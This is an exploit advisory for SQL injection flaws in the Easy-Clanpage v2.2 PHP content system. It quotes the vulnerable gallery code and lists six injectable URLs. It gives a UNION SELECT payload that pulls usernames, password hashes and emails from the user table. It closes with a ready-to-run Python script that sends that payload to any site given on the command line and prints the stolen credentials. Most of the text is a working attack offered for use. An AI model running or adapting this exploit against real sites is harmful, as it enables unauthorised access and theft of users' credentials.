Easy-Clanpage <= v2.2 multiple SQL Injection Vulnerability + Exploit
====================================================================

----------------------------Information------------------------------------------------
+Name : Easy-Clanpage <= v2.2 multiple SQL Injection + Exploit
+Autor : Easy Laster
+Date   : 31.03.2010
+Script  : Easy-Clanpage <= v2.2
+Download : Update Version 2.1->2.2 http://www.easy-clanpage.de
/?section=downloads&action=viewdl&id=18
+Price : for free
+Language : PHP
+Discovered by Easy Laster

----------------------------------------------------------------------------------------
+Vulnerability PHP Code
 
-#######################################################################################-
IF(isset($_GET[&#039;action&#039;])) {
        switch($_GET[&#039;action&#039;]) {
            case "viewpic":
                gallery_show_pic($_GET[&#039;id&#039;]);
            break;
            case "gallery":
                gallery_show_gallery($_GET[&#039;id&#039;]);
            break;
            case "kate":
                gallery_show_kate($_GET[&#039;id&#039;]);
            break;
            case "comments":
                gallery_show_pic((int)$_GET[&#039;id&#039;]);
            break;
            case "commentsadd":
                write_comment(&#039;gallery&#039;, (int)$_GET[&#039;id&#039;], ALLOW_ANONYM, SPAM_NEWS_COMMENT , LIMIT_COMMENTS);
            break;
            case "commentsquote":
                write_comment_qoute(&#039;gallery&#039;, (int)$_GET[&#039;id&#039;],(int)$_GET[&#039;quote&#039;]);
            break;
            case "commentsedit":
                comments_edit(&#039;gallery&#039;, (int)$_GET[&#039;subid&#039;], (int)$_GET[&#039;id&#039;], LIMIT_COMMENTS);
            break;
            default:
                gallery();
        }
-#######################################################################################-
 
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=viewpic&id=
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=gallery&id=
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=kate&id=
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=comments&id=
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=commentsquote&id=
+Vulnerability : http://www.site.com/easyclanpage/?section=gallery&action=commentsedit&id=
 
+SQL Injection
+Exploitable   : http://www.site.com/easyclanpage/?section=gallery&action=gallery&id=
-1111111111+union+select+1,2,concat(username,0x3a,password,0x3a,email),4+from+ecp_user
+where+userID=1--+
 
-----------------------------------------------------------------------------------------
 
#Exploit
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, re
 
if len(sys.argv) < 2:
    print "***************************************************************"
    print "*************** Easy-Clanpage v2.2 Gallery Hack ***************"
    print "***************************************************************"
    print "*         Discovered and vulnerability by Easy Laster         *"      
    print "*         Easy-Clanpage <= v2.2 SQL Injection Exploit         *"
    print "*                      coded by Dr.ChAoS                      *"
    print "*                                                             *"
    print "* Usage:                                                      *"
    print "* python exploit.py http://site.de/ecp/ <userid, default=1>   *"
    print "*                                                             *"
    print "***************************************************************"
    exit()
 
if len(sys.argv) < 3:
    id = 1
else:
    id = sys.argv[2]
 
site = sys.argv[1]
if site[-1:] != "/":
    site += "/"
 
url = site + "index.php?section=gallery&action=gallery&id=-1111111111+union+select+1,2,concat(0x23,0x23,0x23,0x23,0x23,username,0x3a,password,0x3a,email,0x23,0x23,0x23,0x23,0x23),4+from+ecp_user+where+userID=" + str(id) + "--"
 
print "Exploiting..."
 
html = urllib2.urlopen(url).read()
# I hate regex!
data = re.findall(r"#####(.*)\:([0-9a-fA-F]{32})\:(.*)#####", html)
if len(data) > 0:
    print "Success!\n"
    print "ID: " + str(id)
    print "Username: " + data[0][0]
    print "Password: " + data[0][1]
    print "E-Mail: " + data[0][2]
    print "\nHave a nice day!"
else:
    print "Exploit failed..."



